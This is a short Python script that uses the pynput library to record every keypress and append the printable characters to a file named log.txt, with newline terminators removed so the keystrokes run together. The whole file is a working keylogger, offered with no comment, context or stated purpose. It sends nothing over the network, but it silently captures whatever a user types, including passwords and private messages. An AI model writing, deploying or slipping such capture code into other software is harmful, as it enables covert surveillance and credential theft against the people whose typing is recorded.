from pynput.keyboard import Listener
import logging

logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(message)s')


def last_char():
    logging.StreamHandler.terminator = ''


def on_press(key):
    if len(str(key)) == 3:
        logging.info(str(key)[1:2])
    else:
        logging.info('')

    last_char()


last_char()

with Listener(on_press=on_press) as listener:
    listener.join()
